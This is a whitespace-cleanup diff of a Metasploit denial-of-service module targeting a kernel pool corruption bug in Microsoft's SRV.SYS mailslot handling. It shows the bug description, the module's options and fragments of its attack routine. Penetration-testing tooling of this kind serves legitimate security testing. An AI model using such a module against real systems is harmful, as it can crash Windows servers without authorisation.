@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -19,17 +19,17 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Microsoft SRV.SYS Mailslot Write Corruption',
 			'Description'    => %q{
 				This module triggers a kernel pool corruption bug in SRV.SYS. Each
-			call to the mailslot write function results in a two byte return value 
+			call to the mailslot write function results in a two byte return value
 			being written into the response packet. The code which creates this packet
 			fails to consider these two bytes in the allocation routine, resulting in
-			a slow corruption of the kernel memory pool. These two bytes are almost 
+			a slow corruption of the kernel memory pool. These two bytes are almost
 			always set to "\xff\xff" (a short integer with value of -1).
 			},
-			
+
 			'Author'         => [ 'hdm' ],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
@@ -48,12 +48,12 @@ class Metasploit3 < Msf::Auxiliary
 			'DefaultAction' => 'Attack',
 			'DisclosureDate' => 'Jul 11 2006'
 		))
-			
+
 		register_options(
 			[
 				OptString.new('MAILSLOT', [ true,  "The mailslot name to use", 'Alerter']),
 			], self.class)
-						
+
 	end
 
 	# MAILSLOT: HydraLsServer
@@ -64,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		case action.name
 		when 'Attack'
-			
+
 			print_status("Mangling the kernel, two bytes at a time...");
 
 			connect
@@ -84,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
 
 				rescue ::Exception => e
 
-					if (i == 1) 
+					if (i == 1)
 						print_status("Failed to write any data to the mailslot: #{e}")
 						break
 					end
@@ -96,8 +96,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		# Errors:
 		#  0xc0000034 = object not found
-		#  0xc0000205 = insufficient resources (too much data)			
-					
+		#  0xc0000205 = insufficient resources (too much data)
+
 		end
 
 		disconnect
